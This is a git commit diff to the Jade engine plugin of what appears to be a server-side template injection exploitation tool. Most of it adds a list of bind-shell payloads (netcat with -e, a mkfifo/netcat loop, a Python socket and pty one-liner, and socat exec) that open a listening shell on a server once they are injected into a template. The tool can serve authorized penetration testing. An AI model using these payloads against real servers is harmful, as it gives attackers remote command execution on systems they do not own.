88b7f676ad6cecece8171238b5e6952572b0bfe5
Emilio Pinna <emilio.pinna@barclays.com>
2016-07-25 16:29:29 +0100

    Add tcp_shell payloads in Jade

--- plugins/engines/jade.py
+++ plugins/engines/jade.py
@@ -35,8 +35,8 @@ class Jade(Plugin):
         },
         'blind' : {
             'call': 'execute_blind',
-            'bool_true' : 'TRUE',
-            'bool_false' : 'FALSE'
+            'bool_true' : 'true',
+            'bool_false' : 'false'
         },
         # Not using execute here since it's rendered and requires set headers and trailers
         'execute_blind' : {
@@ -49,8 +49,12 @@ class Jade(Plugin):
         },
         'tcp_shell' : {
             'call' : 'execute_blind',
-            'tcp_shell_nc': 'rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f',
-            'tcp_shell_python': """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("%(shell)s");s.close()';"""
+            'tcp_shell': [
+                """nc -l -p %(port)s -e %(shell)s""",
+                """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f""",
+                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\'\', %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn(\'%(shell)s\');s.close()';""",
+                """socat tcp-l:%(port)s exec:%(shell)s"""
+            ]
         }
     }
 
